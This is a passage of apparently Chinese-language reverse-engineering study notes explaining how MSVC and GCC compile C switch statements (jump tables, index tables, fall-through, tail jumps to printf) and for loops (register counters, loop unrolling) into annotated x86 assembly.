$LN2@f;if a&#x3D;&#x3D;2    ;default    mov    DWORD PTR _a$[esp-4], OFFSET $SG791 ; &#39;something unknown&#39;, 0aH, 00H    jmp    _printf$LN2@f:;2    mov    DWORD PTR _a$[esp-4], OFFSET $SG789 ; &#39;two&#39;, 0aH, 00H    jmp    _printf$LN3@f:;1    mov    DWORD PTR _a$[esp-4], OFFSET $SG787 ; &#39;one&#39;, 0aH, 00H    jmp    _printf$LN4@f:;0    mov    DWORD PTR _a$[esp-4], OFFSET $SG785 ; &#39;zero&#39;, 0aH, 00H    jmp    _printf_f     ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两处不同</p><ul><li><p>a存到eax之后，eax-0；这样看似无意义,实际上可以检查eax寄存器的值是否为0,如果eax是0，ZF=1,进而检查第一个判断条件,如果不是就继续-1判断</p></li><li><p>在把字符串指针存储到变量<em>a</em>之后，函数使用JMP指令调用printf()函数。</p><p>这点不难解释：调<mark>用方函数把参数推送入栈之后，的确通常通过CALL指令调用其他函数。这种情况下，CALL指令会把返回地址推送入栈、并通过无条件转移的手段启用被调用方函数</mark>。就本例而言，在被调用方函数运行的任意时刻，栈的内存存储结构为：</p><ul><li>ESP——指向RA。</li><li>ESP＋4——指向变量<em>a</em>。</li></ul><p>另一方面，在本例程序调用printf()函数之前、之后，<mark>除了制各第一个格式化字符串的参数问题以外，栈的存储结构其实没有发生变化</mark>。所以，编译器在分配JMP指令之前，把字符串指针存储到相应地址上。</p><p>这个程序把<mark>函数的第一个参数替换为字符串的指针</mark>，然后跳转到printf()函数的地址，就好像程序没有“调用”过f()函数、直接“转移”了printf()函数一般。当printf()函数完成输出的使命以后，它会执行RET返回指令。RET指令会从栈中读取（POP）返回地址RA、并跳转到RA。不过<mark>这个RA不是其调用方函数——f()函数内的某个地址，而是调用f()函数的函数即main()函数的某个地址</mark>。换而言之，==跳转到这个RA地址后，printf()函数会伴随其调用方函数f()==一同结束。</p><p>除非每个case从句的最后一条指令都是调用printf()函数，否则编译器就做不到这种程度的优化。某种意义上说这与longjmp()函数十分相似。当然，这种优化的目的无非就是提高程序的运行速度。</p></li></ul><h3 id="case较多的情形"><a class="markdownIt-Anchor" href="#case较多的情形"></a> case较多的情形</h3><p>在switch()语句存在大量case()分支的情况下，编译器就不能直接套用大量JE/JNE指令了。会生成一种跳转表,否则程序代码肯定会非常庞大。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"zero\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"one\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"two\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"three\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"four\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"something unknown\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// test</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x86,未开启优化,msvs</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">tv64 &#x3D; -4    ; size&#x3D;4 _a$  &#x3D;  8    ; size &#x3D; 4_f     PROC     push   ebp     mov    ebp, esp;函数序言     push   ecx     mov    eax, DWORD PTR _a$[ebp];eax&#x3D;a     mov    DWORD PTR tv64[ebp], eax;tv64&#x3D;a     cmp    DWORD PTR tv64[ebp], 4;if a&#x3D;&#x3D;4     ja     SHORT $LN1@f;if a&gt;4     mov    ecx, DWORD PTR tv64[ebp]     jmp    DWORD PTR $LN11@f[ecx*4];jmp 跳转表$LN6@f:0     push   OFFSET $SG739 ; &#39;zero&#39;, 0aH, 00H     call   _printf     add    esp, 4     jmp    SHORT $LN9@f$LN5@f:1     push   OFFSET $SG741 ; &#39;one&#39;, 0aH, 00H     call   _printf     add    esp, 4     jmp    SHORT $LN9@f$LN4@f:2     push   OFFSET $SG743 ; &#39;two&#39;, 0aH, 00H     call   _printf     add    esp, 4     jmp    SHORT $LN9@f$LN3@f:3     push   OFFSET $SG745 ; &#39;three&#39;, 0aH, 00H     call   _printf     add    esp, 4     jmp    SHORT $LN9@f$LN2@f:4     push   OFFSET $SG747 ; &#39;four&#39;, 0aH, 00H     call   _printf     add    esp, 4     jmp    SHORT $LN9@f$LN1@f:defalut     push   OFFSET $SG749 ; &#39;something unknown&#39;, 0aH, 00H     call   _printf     add    esp, 4$LN9@f:;ret     mov    esp, ebp     pop    ebp     ret    0     npad    2; align next label$LN11@f:;跳转表     DD    $LN6@f ; 0     DD    $LN5@f ; 1     DD    $LN4@f ; 2     DD    $LN3@f ; 3     DD    $LN2@f ; 4_f     ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>汇编解读:</p><ul><li><p>这段代码可被分为数个调用<code>printf()</code>函数的指令组</p></li><li><p>$ln11@F的偏移量开始的表叫做跳转表(jumptable)</p></li><li><p>函数最初把变量a与数字4进行比较，如果a&gt;4，就打印something unknown</p></li><li><p><code>jmp    DWORD PTR $LN11@f[ecx*4]</code>如果a&lt;=4，会先计算a*4,然后根据LN11@f这个表查询，并跳转到这个表所指向的地址。<mark>为什么要x4?是因为x86系统的内存地址都是32位数据，每个地址占用4字节，偏移地址需要x4才能到达</mark></p><p>此时的switch语句等效于<code>jmp DWORD PTR ($LN11@f[ecx*4])$LN11@f+ecx*4</code></p></li><li><p>npad指令属于<code>汇编宏</code>，==它的作用是把紧接其后的标签地址向4字节（或16字节）边界对齐。==npad的地址对齐功能可<code>提高处理器的IO读写效率</code>，通过一次操作即可完成内存总线、缓冲内存等设备的数据操作。</p></li></ul></li></ul><p>switch()的大体框架</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">MOV REG,inputCMP REG,4 ; maximal number of casesJA default SHL REG,3 ; find element in table.shift for 3bits in x64.MOV REG, jump_table[REG]JMP REGcase1;     ; do something     JMP exitcase2;     ; do something     JMP exitcase3;     ; do something     JMP exitcase4;     ; do something     JMP exitCase5;     ; do something     JMP exitdefaule:     …exit:     …jump_table dd casel           dd case2           dd case3           dd case4           dd case5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若不使用上述指令，我们也可以<mark>在32位系统上使用指令JMP jump_table[REG*4]</mark>/在<mark>64位上使用JMP jump_table[REG*8]</mark>，实现转移表中的寻址计算。</p><p>说到底，转移表只不过是某种指针数组它和18.5节介绍的那种指针数组十分雷同。</p><h3 id="case从句多对一"><a class="markdownIt-Anchor" href="#case从句多对一"></a> case从句多对一</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">f</span> <span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">switch</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>         <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">10</span><span class="token operator">:</span>                  <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"1, 2, 7, 10\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                  <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"3, 4, 5\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">20</span><span class="token operator">:</span>         <span class="token keyword">case</span> <span class="token number">21</span><span class="token operator">:</span>                  <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"8 9, 21\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token number">22</span><span class="token operator">:</span>                  <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"22\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">default</span><span class="token operator">:</span>                  <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"default\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果编译器刻板地按照每种可能的逻辑分支逐一分配对应的指令组，那么程序里将会存在大量的重复指令。一般而言，编译器会通过某种<mark>派发机制</mark>来降低代码的冗余度。</p><p>使用MSVS 开启/Ox优化</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> 1 $SG2798 DB        &#39;1, 2, 7, 10&#39;, 0aH, 00H 2 $SG2800 DB        &#39;3, 4, 5&#39;, 0aH, 00H 3 $SG2802 DB        &#39;8, 9, 21&#39;, 0aH, 00H 4 $SG2804 DB        &#39;22&#39;, 0aH, 00H 5 $SG2806 DB        &#39;default&#39;, 0aH, 00H 6 7 _a$ &#x3D; 8 8 _f      PROC 9         mov       eax, DWORD PTR _a$[esp-4]10         dec       eax11         cmp       eax, 2112         ja        SHORT $LN1@f13         movzx     eax, BYTE PTR $LN10@f[eax];从eax寄存器指向的内存地址中读取一个字节（BYTE）大小的数据，然后无符号扩展这个字节到32位（DWORD），最后将扩展后的结果存储到eax寄存器中。14         jmp       DWORD PTR $LN11@f[eax*4]15 $LN5@f:16         mov       DWORD PTR _a$[esp-4], OFFSET $SG2798 ; &#39;1, 2, 7, 10&#39;17         jmp       DWORD PTR __imp__printf18 $LN4@f:19         mov       DWORD PTR _a$[esp-4], OFFSET $SG2800 ; &#39;3, 4, 5&#39;20         jmp       DWORD PTR __imp__printf21 $LN3@f:22         mov       DWORD PTR _a$[esp-4], OFFSET $SG2802 ; &#39;8, 9, 21&#39;23         jmp       DWORD PTR __imp__printf24 $LN2@f:25         mov       DWORD PTR _a$[esp-4], OFFSET $SG2804 ; &#39;22&#39;26         jmp       DWORD PTR __imp__printf27 $LN1@f:28         mov       DWORD PTR _a$[esp-4], OFFSET $SG2806 ; &#39;default&#39;29         jmp       DWORD PTR __imp__printf30         npad      2 ; align $LN11@f table on 16-byte boundary31 $LN11@f:32         DD        $LN5@f ; print &#39;1, 2, 7, 10&#39;33         DD        $LN4@f ; print &#39;3, 4, 5&#39;34         DD        $LN3@f ; print &#39;8, 9, 21&#39;35         DD        $LN2@f ; print &#39;22&#39;36         DD        $LN1@f ; print &#39;default&#39;37 $LN10@f:38         DB        0 ; a&#x3D;1  ;byte型1个字节39         DB        0 ; a&#x3D;240         DB        1 ; a&#x3D;341         DB        1 ; a&#x3D;442         DB        1 ; a&#x3D;543         DB        1 ; a&#x3D;644         DB        0 ; a&#x3D;745         DB        2 ; a&#x3D;846         DB        2 ; a&#x3D;947         DB        0 ; a&#x3D;1048         DB        4 ; a&#x3D;1149         DB        4 ; a&#x3D;1250         DB        4 ; a&#x3D;1351         DB        4 ; a&#x3D;1452         DB        4 ; a&#x3D;1553         DB        4 ; a&#x3D;1654         DB        4 ; a&#x3D;1755         DB        4 ; a&#x3D;1856         DB        4 ; a&#x3D;1957         DB        2 ; a&#x3D;2058         DB        2 ; a&#x3D;2159         DB        3 ; a&#x3D;2260 _f      ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编解读:</p><ul><li><p>这里使用了两个表，一个是索引表$LN10@f,另一个转移表是$LN11@f</p></li><li><p><code>movzx</code> 是汇编语言中的一个指令，它是 <code>move with zero extend</code> 的缩写，用于无符号扩展并传送数据。此指令主要用于将一个较小位宽的数据（通常是8位或16位）加载到一个较大位宽的寄存器或内存位置中，并在<mark>扩展高位时用0填充。</mark></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">1mov bl, 80h   ; 将8位立即数80h送入8位寄存器BL2movzx ax, bl  ; 将BL的内容无符号扩展到16位，并放入AX寄存器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这个例子中，<code>BL</code> 寄存器中的值是 <code>80h</code>（十进制128），当使用 <code>movzx</code> 指令将 <code>BL</code> 的内容复制到 <code>AX</code> 寄存器时，因为是无符号扩展，所以 <code>BL</code> 的值被扩展为 <code>0080h</code>（前导的高位补0），这样 <code>AX</code> 寄存器的值就变成了 <code>0080h</code>。</p></li><li><p>首先movzx指令在索引表中查询输入值,返回0(input1,2,7,10);1(input3,4,5),2(input8,9,21),3(input 22)4(default)</p></li><li><p>然后把缩影表的返回值，在第二个转移表中完成跳转s</p></li></ul><hr /><h3 id="fall-through"><a class="markdownIt-Anchor" href="#fall-through"></a> fall-through</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token number">1</span> #define R <span class="token number">1</span> <span class="token number">2</span> #define W <span class="token number">2</span> <span class="token number">3</span> #define RW <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">)</span> <span class="token number">6</span> <span class="token punctuation">&#123;</span> <span class="token number">7</span>          <span class="token keyword">int</span> read<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> write<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token number">8</span> <span class="token number">9</span>          <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token number">10</span>          <span class="token punctuation">&#123;</span><span class="token number">11</span>          <span class="token keyword">case</span> RW<span class="token operator">:</span><span class="token number">12</span>                   read<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">13</span>          <span class="token keyword">case</span> W<span class="token operator">:</span><span class="token number">14</span>                   write<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">15</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token number">16</span>          <span class="token keyword">case</span> R<span class="token operator">:</span><span class="token number">17</span>                   read<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">18</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token number">19</span>          <span class="token keyword">default</span><span class="token operator">:</span><span class="token number">20</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token number">21</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token number">22</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"read=%d, write=%d\n"</span><span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">23</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论type的值是RW还是W，程序都会执行第14行的指令。type为RW的陈述语句里没有break指令，从而利用switch语句的fall through效应。</p><p>msvs x86 assembly</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">$SG1305 DB       &#39;read&#x3D;%d, write&#x3D;%d&#39;, 0aH, 00H_write$ &#x3D; -12    ; size&#x3D; 4_read$  &#x3D; -8     ; size&#x3D; 4tv64  &#x3D; -4       ; size&#x3D; 4_type$  &#x3D; 8      ; size&#x3D; 4_f        PROC          push   ebp          mov    ebp, esp          sub    esp, 12;int write,read,tv64          mov    DWORD PTR _read$[ebp], 0;read&#x3D;0          mov    DWORD PTR _write$[ebp], 0;write&#x3D;0          mov    eax, DWORD PTR _type$[ebp];eax&#x3D;type          mov    DWORD PTR tv64[ebp], eax;tv64&#x3D;type          cmp    DWORD PTR tv64[ebp], 1 ; R          je     SHORT $LN2@f          cmp    DWORD PTR tv64[ebp], 2 ; W          je     SHORT $LN3@f;无break语句          cmp    DWORD PTR tv64[ebp], 3 ; RW          je     SHORT $LN4@f          jmp    SHORT $LN5@f;break$LN4@f: ; case RW:          mov    DWORD PTR _read$[ebp], 1$LN3@f: ; case W:          mov    DWORD PTR _write$[ebp], 1          jmp    SHORT $LN5@f$LN2@f: ; case R:          mov    DWORD PTR _read$[ebp], 1$LN5@f: ;printf          mov    ecx, DWORD PTR _write$[ebp]          push   ecx          mov    edx, DWORD PTR _read$[ebp]          push   edx          push   OFFSET $SG1305 ; &#39;read&#x3D;%d, write&#x3D;%d&#39;          call   _printf          add    esp, 12          mov    esp, ebp          pop    ebp          ret    0_f        ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chap14-循环"><a class="markdownIt-Anchor" href="#chap14-循环"></a> Chap14 循环</h2><p>x86指令集里有一条专门的LOOP指令。<mark>LOOP指令检测ECX寄存器的值是否是0，如果它不是0则将其递减，并将操作权交给操作符所指定的标签处（即跳转）</mark>。或许是因为循环指令过于复杂的缘故，至今尚未见过直接使用LOOP指令将循环语句转译成汇编语句的编译器。所以，如果<mark>哪个程序直接使用LOOP指令进行循环控制，那它很可能就是手写的汇编程序。</mark></p><h3 id="for"><a class="markdownIt-Anchor" href="#for"></a> for</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">printing_function</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"f(%d)\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token function">printing_function</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_i$ &#x3D; -4 _main   PROC    push   ebp    mov    ebp, esp    push   ecx    mov    DWORD PTR _i$[ebp], 2     ; 初始态;i&#x3D;2    jmp    SHORT $LN3@main$LN2@main:    mov    eax, DWORD PTR _i$[ebp]     ; 循环控制语句：    add    eax, 1                      ; i递增1    mov    DWORD PTR _i$[ebp], eax$LN3@main:    cmp    DWORD PTR _i$[ebp], 10      ; 判断是否满足循环条件 if i&#x3D;&#x3D;10    jge    SHORT $LN1@main             ; 如果i&#x3D;10 则终止循环语句    mov    ecx, DWORD PTR _i$[ebp]     ; 循环体: call f(i)    push   ecx;传参    call   _printing_function    add    esp, 4    jmp    SHORT $LN2@main             ; 跳到循环开始处$LN1@main: ;exit                            ; 循环结束    xor    eax, eax    mov    esp, ebp    pop    ebp    ret     0_main    ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p>gcc</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">main            proc near    ; 开始定义主程序过程var_20          &#x3D; dword    ptr -20h  ; 定义一个变量var_20，在栈上距离EBP-20h的位置var_4           &#x3D; dword    ptr –4     ; 定义另一个变量var_4，在栈上距离EBP-4的位置                push       ebp         ; 保存当前基址指针（EBP）                mov        ebp, esp    ; 将栈顶指针（ESP）复制到基址指针（EBP），建立新的堆栈帧                and        esp, 0FFFFFFF0h ; 确保ESP为16字节对齐，通过与操作去掉ESP的低4位                sub        esp, 20h    ; 在栈上为局部变量分配空间，减小ESP 32字节(20h)                mov        [esp+20h+var_4], 2 ; 初始化变量var_4，即(i&#x3D;2)，这里存的是循环起始值                jmp        short loc_8048476 ; 无条件跳转到循环条件检查处开始循环loc_8048465:                  ; 循环体开始                mov        eax, [esp+20h+var_4] ; 把计数器(i)的值加载到EAX寄存器                mov        [esp+20h+var_20], eax ; 把EAX的值（即i的值）存入var_20，可能是为调用准备参数                call       printing_function ; 调用打印函数，可能打印var_20中的值                add        [esp+20h+var_4], 1 ; 将计数器(i)加1，即i&#x3D;i+1loc_8048476:                  ; 循环条件检查                cmp        [esp+20h+var_4], 9 ; 比较计数器(i)是否小于等于9                jle        short loc_8048465 ; 如果i&lt;&#x3D;9，则跳转回循环体继续执行                mov        eax, 0      ; 设置返回值为0，这里作为程序正常退出的标志                leave                   ; 恢复先前的堆栈状态，将ESP设置回EBP的值，然后弹出EBP                retn                    ; 返回调用者，结束程序main            endp             ; 结束主程序过程定义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p>msvs开启优化</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_main    PROC     push   esi     mov    esi, 2$LL3@main:     push   esi     call   _printing_function     inc    esi     add    esp, 4     cmp    esi, 10     ; 0000000aH     jl     SHORT $LL3@main     xor    eax, eax     pop    esi     ret    0_main    ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启优化后，<code>ESI</code>寄存器成了计数器<code>i</code>的专用寄存器,大幅简洁了汇编s</p><p><mark>进行这种优化的前提条件是：被调用方函数不应当修改局部变量专用寄存器的值。当然，在本例中编译器能够判断函数printing_function ()不会修改ESI寄存器的值。在编译器决定给局部变量分配专用寄存器的时候，它会在函数序言部分保存这些专用寄存器的初始状态，然后在函数尾声里还原这些寄存器的原始值，因此存在<code>push esi</code>和<code>pop esi</code>来还原原始值</mark></p><hr /><p><code>gcc -O3 -o 1 1,c</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">main            proc nearvar_10          &#x3D; dword ptr -10h                push    ebp                mov     ebp, esp                and     esp, 0FFFFFFF0h                sub     esp, 10h                mov     [esp+10h+var_10], 2                call    printing_function                mov     [esp+10h+var_10], 3                call    printing_function                mov     [esp+10h+var_10], 4                call    printing_function                mov     [esp+10h+var_10], 5                call    printing_function                mov     [esp+10h+var_10], 6                call    printing_function                mov     [esp+10h+var_10], 7                call    printing_function                mov     [esp+10h+var_10], 8                call    printing_function                mov     [esp+10h+var_10], 9                call    printing_function                xor     eax, eax                leave                retnmain            endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>在这里，gcc把循环指令给分解了(就是给展开了)</p><p>编译器会对<mark>迭代次数较少的循环进行循环分解</mark>（Loop unwinding）对处理。展开循环体以后代码的执行效率会有所提升，但是会增加程序代码的体积。</p></li><li><p><mark>如果迭代次数多的话，gcc的优化代码就与msvs相差无几</mark></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">                public mainmain            proc nearvar_20          &#x3D; dword    ptr -20h                push       ebp                mov        ebp, esp                and        esp, 0FFFFFFF0h                push       ebx                mov        ebx, 2 ; i&#x3D;2                sub        esp, 1Ch; aligning label loc_80484D0 (loop body begin) by 16-byte border:                noploc_80484D0:; pass (i) as first argument to printing_function():                mov        [esp+20h+var_20], ebx                add        ebx, 1 ; i++                call       printing_function                cmp        ebx, 64h ; i&#x3D;&#x3D;100?                jnz        short loc_80484D0 ; if not, continue                add        esp, 1Ch                xor        eax, eax ; return 0                pop        ebx                mov        esp, ebp                pop        ebp                retnmain            endp<span aria-hidden="true" 